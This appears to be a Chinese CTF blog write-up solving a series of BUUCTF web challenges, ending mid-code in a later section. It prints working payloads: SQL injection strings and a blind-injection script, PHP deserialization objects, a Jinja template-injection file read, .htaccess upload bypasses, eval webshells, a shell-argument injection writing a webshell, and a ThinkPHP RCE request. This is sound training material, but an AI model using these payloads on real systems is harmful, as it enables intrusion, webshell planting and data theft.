if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ echo $flag; } 这一有一些不同的是md5比较使用了===不仅比较类型还比较值。但是md5有一个：\n1 md5([1,2,3]) == md5([4,5,6]) == NULL 所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。\n1 param1[]=1\u0026amp;param2[]=2 [ZJCTF 2019]NiZhuanSiWei 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php $text = $_GET[\u0026#34;text\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($text)\u0026amp;\u0026amp;(file_get_contents($text,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the zjctf\u0026#34;)){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;h1\u0026gt;\u0026#34;.file_get_contents($text,\u0026#39;r\u0026#39;).\u0026#34;\u0026lt;/h1\u0026gt;\u0026lt;/br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;Not now!\u0026#34;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u0026gt; 先来一段PHP伪协议总结，这题的第一步是判断传入text参数并读取内容，判断内容为welcome to the zjctf，使用data://伪协议。\n1 ?text=data://text/plain,welcome to the zjctf 接下来是文件包含，有了提示useless.php肯定要读一读看看，使用php://filter伪协议。\n1 ?text=data://text/plain,welcome to the zjctf\u0026amp;file=php://filter/convert.base64-encode/resource=useless.php 得到的内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } ?\u0026gt; 并且文件包含下面有一个反序列化，又看到了__tostring函数，当一个对象被当作字符串对待的时候，会触发这个魔术方法。我构造的对象\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Flag{ public $file=\u0026#34;flag.php\u0026#34;; } $f = new Flag(); echo serialize($f); //O:4:\u0026#34;Flag\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;} 在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload\n1 ?text=data://text/plain,welcome to the zjctf\u0026amp;file=useless.php\u0026amp;password=O:4:\u0026#34;Flag\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;} [CISCN2019 华北赛区 Day2 Web1]Hack World 很明显的sql注入，随便尝试一些语句有\n1\t\u0026raquo;\tHello, glzjin wants a girlfriend.\n2\t\u0026raquo;\tDo you want to be my girlfriend?\n3之后都是\t\u0026raquo;\tError Occured When Fetch Result.\n输入一个单引号1'出现了bool(false)，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。\n题目中也有提示\nAll You Want Is In Table \u0026lsquo;flag\u0026rsquo; and the column is \u0026lsquo;flag\u0026rsquo; 说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用substr函数每次截取一个字符，获得其ascii值再使用二分法确定具体的值，最后拼接输出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import requests import time url = \u0026#39;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/\u0026#39; result = \u0026#39;\u0026#39; for x in range(1, 50): high = 127 low = 32 mid = (low + high) // 2 while high\u0026gt;low: payload = \u0026#34;if(ascii(substr((select\tflag\tfrom\tflag),%d,1))\u0026gt;%d,1,2)\u0026#34; % (x, mid) data = { \u0026#34;id\u0026#34;:payload } time.sleep(0.3) response = requests.post(url, data = data) if \u0026#39;Hello\u0026#39; in response.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) #flag{929c8993-2d85-4fbf-8e48-7c457551105e} [极客大挑战 2019]HardSQL 还是sql注入题。尝试在输入框里输入#、--+时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的十种MySQL报错注入。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用()隔开，具体payload如下：\n爆表 1 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23\u0026amp;password=1 当前表名是：H4rDsq1\n爆字段 1 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\u0026#39;H4rDsq1\u0026#39;)),0x7e)))%23\u0026amp;password=1 当前表的字段有：id,username,password\n出数据 如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用left和right函数：\n语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)\n这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下\n1 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(left(password,35))from(H4rDsq1)),0x7e)))%23\u0026amp;password=1 flag{112bb5db-17a4-47e2-97b4-19\n1 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(right(password,11))from(H4rDsq1)),0x7e)))%23\u0026amp;password=1 dc295a017f}\n[网鼎杯 2018]Fakebook 是一个展示自己博客网址的列表，先随便注册一个\n我填的是baidu的网址23333。这时的url是：\n1 http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1 看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[网鼎杯2018]fakebook题解，使用了load_file函数直接读取了flag文件。同样是空格被过滤，但是可以使用/**/绕过。\n非预期解 1 ?no=-1 union/**/select 1,2,3,4 先使用上面的语句查看回显点。\n找的了位置2的回显点，可以把函数替换在2的位置上。\n1 ?no=-1 union/**/select 1,load_file(\u0026#39;/var/www/html/flag.php\u0026#39;),3,4 参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣\n预期解 正常的sql注入一套查询，同样是使用/**/绕过空格过滤。\n爆表\n1 ?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23 爆字段\n1 ?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\u0026#39;users\u0026#39; %23 出数据\n1 ?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users 查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：\n1 O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:7:\u0026#34;guobang\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:4:\u0026#34;blog\u0026#34;;s:20:\u0026#34;http://www.baidu.com\u0026#34;;} 说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示the contents of his/her blog，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：使用伪协议读取flag作为blog网站回显在iframe的标签中，所以构造一个序列化对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php class UserInfo { public $name = \u0026#34;guobang\u0026#34;; public $age = 18; public $blog = \u0026#34;file:///var/www/html/flag.php\u0026#34;; } $s = new UserInfo(); echo serialize($s); //O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:7:\u0026#34;guobang\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:4:\u0026#34;blog\u0026#34;;s:29:\u0026#34;file:///var/www/html/flag.php\u0026#34;;} 最终payload\n1 ?no=-1%20union/***/select%201,2,3,\u0026#39;O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:7:\u0026#34;guobang\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:4:\u0026#34;blog\u0026#34;;s:29:\u0026#34;file:///var/www/html/flag.php\u0026#34;;}\u0026#39; from%20users 在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。\n[网鼎杯 2020 青龙组]AreUSerialz 部分图\n最下面有对于payload的限制：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function is_valid($s) { for($i = 0; $i \u0026lt; strlen($s); $i++) if(!(ord($s[$i]) \u0026gt;= 32 \u0026amp;\u0026amp; ord($s[$i]) \u0026lt;= 125)) return false; return true; } if(isset($_GET{\u0026#39;str\u0026#39;})) { $str = (string)$_GET[\u0026#39;str\u0026#39;]; if(is_valid($str)) { $obj = unserialize($str); } } 需要payload中的字符ascii码值大于32小于125。注意到最后有一个unserialize函数，判断这道题考点是反序列化。接下来分析源码：\nprocess()函数判断op的值，如果是1就写入文件，如果是2就读取文件。代码开头包含了flag.php文件，所以推测需要使用2操作数读取flag.php文件。 write()把对象中的$content属性值写入到$filename文件中，如果长度大于100会被拦下。 read()使用**file_get_contents()**函数读取文件。正是我们想要的。 output()输出内容。 __destruct()对象销毁时会执行的函数，需要注意的是if判断里的$this-\u0026gt;op === \u0026quot;2\u0026quot;是强比较，并且会修改op的值为1（写文件），因为**\u0026ldquo;2\u0026rdquo;是一个字符串类型的如果传入整型的2**即可绕过。 所以我们构造一个对象op为2，filename为flag.php即可，读文件的时候肯定不是\n接下来是反序列化时会遇到的问题，因为对象中属性的修饰是protected，序列化时需要保证一致的。\n先给出自己创建的对象源码\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class FileHandler { protected $op=2; protected $filename=\u0026#34;/var/www/html/flag.php\u0026#34;; protected $content; } $c = new FileHandler(); echo serialize($c); PHP7.1以上版本对属性类型不敏感、用public绕过: 1 O:11:\u0026#34;FileHandler\u0026#34;:3:{s:2:\u0026#34;op\u0026#34;;i:2;s:8:\u0026#34;filename\u0026#34;;s:22:\u0026#34;/var/www/html/flag.php\u0026#34;;s:7:\u0026#34;content\u0026#34;;N;} 运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。\n1 O:11:\u0026#34;FileHandler\u0026#34;:3:{s:2:\u0026#34;op\u0026#34;;i:2;s:8:\u0026#34;filename\u0026#34;;s:52:\u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;;s:7:\u0026#34;content\u0026#34;;N;} 序列化字符串中s替换为S，支持字符串用16进制， 1 O:11:\u0026#34;FileHandler\u0026#34;:3:{S:5:\u0026#34;\\00*\\00op\u0026#34;;i:2;S:11:\u0026#34;\\00*\\00filename\u0026#34;;S:22:\u0026#34;/var/www/html/flag.php\u0026#34;;S:10:\u0026#34;\\00*\\00content\u0026#34;;N;} 思路：https://blog.csdn.net/Oavinci/article/details/106998738\n[MRCTF2020]你传你🐎呢 测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的.htaccess\n1 SetHandler application/x-httpd-php 传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了Content-Type: image/jpeg可以了，说明Content-Type是GIF还不行，接下来直接传图片码\n根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了\n不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考【极客大挑战 2019】RCE ME。\n[BJDCTF 2nd]fake google 就一个输入框，随便输入一个去看看，跳转以后\n注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试SSTI (服务器模板注入)\n找到了一个直接读文件的payload\n1 ?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/flag\u0026#39;, \u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} [GYCTF2020]Blacklist sql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容\n1 return preg_match(\u0026#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); 前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：\n1 2 3 4 -1\u0026#39;;show tables; FlagHere words 查看表结构：\n1 -1\u0026#39;;desc `FlagHere`; 接下来是看的wp，学到了个新姿势：使用HANDLER ... OPEN语句，贴一个官方文档。\nHANDLER ... OPEN语句打开一个表，使其可以使用后续HANDLER ... READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭\n1 -1\u0026#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close [强网杯 2019]高明的黑客 下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 # codeing = utf-8 import requests import os import re import threading import time requests.adapters.DEFAULT_RETRIES = 8 session = requests.session() session.keep_alive = False sem=threading.Semaphore(30) url=\u0026#34;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/\u0026#34; path = \u0026#34;D:\\DROPS\\phpstudy_pro\\WWW\\ctf\\src\\\\\u0026#34; fileNames = os.listdir(path) rrGET = re.compile(r\u0026#34;\\$_GET\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) rrPOST = re.compile(r\u0026#34;\\$_POST\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) local_file = open(\u0026#34;flag.txt\u0026#34;,\u0026#34;w\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;) def run(fileName): with sem: file = open(path+fileName,\u0026#39;r\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) content = file.read() print(\u0026#34;[+]checking: %s\u0026#34;%fileName) #GET for i in rrGET.findall(content): r = session.get(url+\u0026#34;%s?%s=%s\u0026#34;%(fileName,i,\u0026#34;echo ~guobanghhh~\u0026#34;)) if \u0026#34;~guobanghhh~\u0026#34; in r.text: flag = fileName + \u0026#34;中的\u0026#34; + i + \u0026#34;可以用！！！\u0026#34; print(flag) local_file.write(flag) #POST # for i in rrPOST.findall(content): # r = session.post(url+fileName,data={i:\u0026#34;echo ~guobanghhh~\u0026#34;}) # if \u0026#34;~guobanghhh~\u0026#34; in r.text: # flag = fileName + \u0026#34;中的\u0026#34; + i + \u0026#34;可以用！！！\u0026#34; # print(flag) # local_file.write(flag) if __name__ == \u0026#39;__main__\u0026#39;: run(\u0026#34;xk0SzyKwfzw.php\u0026#34;) start_time = time.time() # 开始时间 print(\u0026#34;[start]程序开始:\u0026#34; + str(start_time)) thread_list = [] for fileName in fileNames: t = threading.Thread(target=run,args=(fileName,)) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() 结果就是访问\n1 http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag 获得flag\n[MRCTF2020]Ez_bypass 不截图了，主页没有代码格式，贴一个源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 I put something in F12 for you include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } }Please input first 分析一波：\n第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较===噢。 第11、17行判断passwd是非数字并且若比较==等于1234567 第一个利用数组即可绕过\n1 md5([1,2,3]) == md5([4,5,6]) == NULL 第二个利用比较时会进行类型转换，字符串1234567a会被强制转换类型为整型的1234567\npayload\n1 2 3 4 ?id[]=1\u0026amp;gg[]=2 POST passwd=1234567a [BUUCTF 2018]Online Tool 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } if(!isset($_GET[\u0026#39;host\u0026#39;])) { highlight_file(__FILE__); } else { $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\u0026#34;glzjin\u0026#34;. $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); echo \u0026#39;you are in sandbox \u0026#39;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34;.$host); } 最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数escapeshellarg、escapeshellcmd。\n这道题利用了两个点\nnmap可以将扫描的结果存储在文件里。使用方法：Nmap扫描结果的保存和输出\nescapeshellarg+escapeshellcmd同时使用有一些漏洞\n谈谈escapeshellarg参数绕过和注入的问题\nPHP escapeshellarg()+escapeshellcmd() 之殇\n参考博客整理一下这两个处理命令的函数同时使用时的问题：\n假如传入的参数为172.17.0.2' -v -d a=1 首先经过escapeshellarg函数，这个函数会把单独的单引号'加上转义符\\并使用单引号'括起来，再使用单引号'把整个参数括起来。这时候的参数是'172.17.0.2'\\'' -v -d a=1' 再进入escapeshellcmd函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号'不过处理，转义符\\再使用转义符转义，再略过一个成对的单引号''，最后一个单引号'再使用转义符转义。这时候的参数就成了'172.17.0.2'\\\\'' -v -d a=1\\' 最后执行的参数是'172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白符。所以可以简化为 172.17.0.2\\ -v -d a=1' 所以构造payload：\n1 \u0026#39;\u0026lt;?php eval($_POST[_]) ?\u0026gt; -oG 1.php \u0026#39; 经过escapeshellarg函数会被解析成为：''\\''\u0026lt;?php eval($_POST[_]) ?\u0026gt; -oG 1.php '\\'''\n再经过escapeshellcmd函数会被解析为：''\\\\''\u0026lt;?php eval($_POST[_]) ?\u0026gt; -oG 1.php '\\\\'''\n注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了1.php\\不在是php文件了。所以我们的payload最终在服务器端是：\\\u0026lt;?php eval($_POST[_]) ?\u0026gt; -oG 1.php \\ 。\n加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。\n1 2 3 4 5 6 7 \u0026lt;?php $host = \u0026#34;\u0026#39;\u0026lt;?php eval($_POST[_]) ?\u0026gt; -oG 1.php \u0026#39;\u0026#34;; echo $host.\u0026#34;\\n\u0026#34;; $host = escapeshellarg($host); echo $host.\u0026#34;\\n\u0026#34;; $host = escapeshellcmd($host); echo $host.\u0026#34;\\n\u0026#34;; 结果：\n1 2 3 \u0026#39;\u0026lt;?php eval() ?\u0026gt; -oG 1.php \u0026#39; \u0026#39;\u0026#39;\\\u0026#39;\u0026#39;\u0026lt;?php eval() ?\u0026gt; -oG 1.php \u0026#39;\\\u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39;\\\u0026lt;\\?php eval\\(\\) \\?\\\u0026gt; -oG 1.php \u0026#39;\\\\\u0026#39;\u0026#39;\u0026#39; 最终请求payload\n1 /?host=\u0026#39;\u0026lt;?php eval($_POST[_]) ?\u0026gt; -oG 1.php \u0026#39; 执行指令时会创建一个sandbox文件夹，访问$sandbox$/1.php，POST传参\n1 _=system(\u0026#39;cat /flag\u0026#39;); [RoarCTF 2019]Easy Java 是java写的web程序\n考点是WEB-INF/web.xml泄露\nWEB-INF主要包含一下文件或目录:\n/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n/WEB-INF/database.properties：数据库配置文件\n漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码\n重点不在登陆界面，而是那个Help按钮，可以下载文件。\n首先尝试去读web.xml文档，添加POST请求\n1 filename=WEB-INF/web.xml 可以读取web.xml文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;Index\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.IndexController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Index\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.LoginController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Login\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.DownloadController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Download\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.FlagController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Flag\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 注意到了一个FlagController的控制器，它所在的类为com.wm.ctf.FlagController，前面也提到了编译文件所在的文件夹/WEB-INF/classes/，去这个文件夹下载FlagController相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：\n1 filename=WEB-INF/classes/com/wm/ctf/FlagController.class class文件源码好多不可见字符\n我选中的那段就是flag在的地方，看到了==就应该意识到是base64编码，但是base64编码里没有\u0026lt;这个字符，所以flag的密文就是\n1 ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg== \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;以下部分施工中👷‍♂️\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; 下面的都是没有整理，先把重要思路写下来了，然后有时间再配图\n[GKCTF2020]cve版签到 CVE-2020-7066\n只有一个按钮，点击以后查看网页的Network请求中有一个\nHint: Flag in localhost\n且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里\nYou just view *.ctfhub.com\n只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：\n1 ?url=http://127.0.0.1%00.ctfhub.com 第二个提示：\nHost must be end with \u0026lsquo;123\u0026rsquo;\n必须以123结尾，所以最终payload\n1 ?url=http://127.0.0.123%00.ctfhub.com [GXYCTF2019]禁止套娃 git泄露。我使用的https://github.com/gakki429/Git_Extract\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php include \u0026#34;flag.php\u0026#34;; echo \u0026#34;flag在哪里呢？\u0026lt;br\u0026gt;\u0026#34;; if(isset($_GET[\u0026#39;exp\u0026#39;])){ if (!preg_match(\u0026#39;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { if(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+\\((?R)?\\)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;])) { if (!preg_match(\u0026#39;/et|na|info|dec|bin|hex|oct|pi|log/i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { // echo $_GET[\u0026#39;exp\u0026#39;]; @eval($_GET[\u0026#39;exp\u0026#39;]); } else{ die(\u0026#34;还差一点哦！\u0026#34;); } } else{ die(\u0026#34;再好好想想！\u0026#34;); } } else{ die(\u0026#34;还想读flag，臭弟弟！\u0026#34;); } } // highlight_file(__FILE__); ?\u0026gt; 正则表达式匹配的只有函数的形式如var_dump();是一道无参数RCE，看的题解自己整理的payload：\n1 ?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv())))))); 一层一层解释：\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组\n图片展示\ncurrent() 返回数组中的当前单元, 默认取第一个值。别名pos()\n到这里获得的是一个点\nscandir() 遍历目录，是.的话就是列出当前目录。\n此时输出：\n1 array(5) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(4) \u0026#34;.git\u0026#34; [3]=\u0026gt; string(8) \u0026#34;flag.php\u0026#34; [4]=\u0026gt; string(9) \u0026#34;index.php\u0026#34; } 这时的输出还是键值对的形式，我们需要使用array_flip()函数交换键值对，然后使用随机函数array_rand()从数组中随机取出一个或多个单元。因为正则的原因无法使用file_get_contents()，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。\n[GXYCTF2019]BabyUpload ph过滤，image/gif不能通过。image/jpe可以\n上传.htaccess\n1 SetHandler application/x-httpd-php 上传码，但是不能是php代码，使用js\n1 \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;eval($_REQUEST[shell])\u0026lt;/script\u0026gt; 完工\n[BJDCTF 2nd]old-hack ThinkPHP的漏洞\nThinkPHP5 5.0.23\n1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=cat /flag [安洵杯 2019]easy_web 看url一个img和cmd，页面中有一个图片的标签，和一个md5 is funny ~。把url中img的值进行解码发现图片名为555.png，尝试用同样的编码方式读取index.php，加密的编码依次为：hex\u0026ndash;\u0026gt;base64\u0026ndash;\u0026gt;base64。\nindex.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;?php error_reporting(E_ALL || ~ E_NOTICE); header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); $cmd = 